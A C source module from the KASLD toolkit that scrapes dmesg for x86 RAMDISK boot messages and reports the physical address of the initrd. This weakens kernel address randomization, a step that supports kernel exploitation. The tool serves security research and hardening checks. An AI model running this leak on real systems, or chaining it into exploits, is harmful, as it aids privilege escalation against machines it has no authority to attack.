// This file is part of KASLD - https://github.com/bcoles/kasld
//
// reserve_initrd() and relocate_initrd() print RAMDISK physical memory
// locations during boot on x86 / x86_64:
//
// x86:
// RAMDISK: [mem 0x2e53b000-0x33294fff]
//
// x86 (when relocation is needed):
// Allocated new RAMDISK: [mem 0x37200000-0x37be2fff]
// Move RAMDISK from [mem 0x35f1b000-0x369fdfff] to [mem 0x37200000-0x37be2fff]
//
// Requires:
// - CONFIG_BLK_DEV_INITRD=y (very common; initrd/initramfs is standard)
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.8/source/arch/x86/kernel/setup.c
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#if !defined(__i386__) && !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

/* Parse "[mem 0x<start>-0x<end>]" and return start address, or 0 on failure */
static unsigned long parse_mem_range(const char *p) {
  const char *tag = strstr(p, "[mem 0x");
  if (!tag)
    return 0;

  char *endptr;
  unsigned long addr = strtoul(tag + 5, &endptr, 16);
  if (endptr == tag + 5 || addr == 0)
    return 0;

  return addr;
}

static int on_match(const char *line, void *ctx) {
  (void)ctx;
  unsigned long addr;
  const char *label;

  /*
   * Three possible formats, all from arch/x86/kernel/setup.c:
   *   "RAMDISK: [mem %#010llx-%#010llx]"
   *   "Allocated new RAMDISK: [mem %#010llx-%#010llx]"
   *   "Move RAMDISK from [mem %#010llx-%#010llx] to [mem ...]"
   *
   * For "Move RAMDISK", the destination (second [mem ...]) is more useful
   * since that's the final location. The "Allocated new RAMDISK" line
   * prints the same address, so we can just match on "[mem 0x" in any
   * RAMDISK line.
   */

  if (strstr(line, "Move RAMDISK from")) {
    /* Extract destination: the second "[mem 0x" */
    const char *first = strstr(line, "[mem 0x");
    if (!first)
      return 1;
    const char *second = strstr(first + 1, "[mem 0x");
    if (second) {
      addr = parse_mem_range(second);
      label = "dmesg_ramdisk:relocated";
    } else {
      addr = parse_mem_range(first);
      label = "dmesg_ramdisk:move_src";
    }
  } else if (strstr(line, "Allocated new RAMDISK:")) {
    addr = parse_mem_range(line);
    label = "dmesg_ramdisk:allocated";
  } else {
    /* "RAMDISK: [mem ...]" — initial location */
    addr = parse_mem_range(line);
    label = "dmesg_ramdisk";
  }

  if (!addr)
    return 1;

  printf("leaked RAMDISK physical address: 0x%016lx\n", addr);
  kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, addr, label);

  return 1; /* keep scanning for more lines */
}

int main(void) {
  printf("[.] searching dmesg for RAMDISK physical addresses ...\n");
  int found = dmesg_search("RAMDISK", on_match, NULL);
  return found ? 0 : 1;
}
